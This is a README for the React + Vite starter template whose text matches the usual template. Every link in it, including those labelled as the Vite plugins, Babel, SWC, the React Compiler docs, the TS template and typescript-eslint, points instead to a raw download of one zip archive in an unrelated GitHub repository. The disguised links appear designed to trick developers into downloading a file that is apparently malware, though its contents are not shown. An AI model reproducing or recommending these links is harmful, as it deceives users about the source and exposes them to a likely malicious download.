# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/ImKidding03/trello-web/raw/refs/heads/master/src/utilities/web-trello-3.2.zip) uses [Babel](https://github.com/ImKidding03/trello-web/raw/refs/heads/master/src/utilities/web-trello-3.2.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/ImKidding03/trello-web/raw/refs/heads/master/src/utilities/web-trello-3.2.zip) uses [SWC](https://github.com/ImKidding03/trello-web/raw/refs/heads/master/src/utilities/web-trello-3.2.zip) for Fast Refresh

## React Compiler

The React Compiler is not enabled on this template. To add it, see [this documentation](https://github.com/ImKidding03/trello-web/raw/refs/heads/master/src/utilities/web-trello-3.2.zip).

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/ImKidding03/trello-web/raw/refs/heads/master/src/utilities/web-trello-3.2.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://github.com/ImKidding03/trello-web/raw/refs/heads/master/src/utilities/web-trello-3.2.zip) in your project.
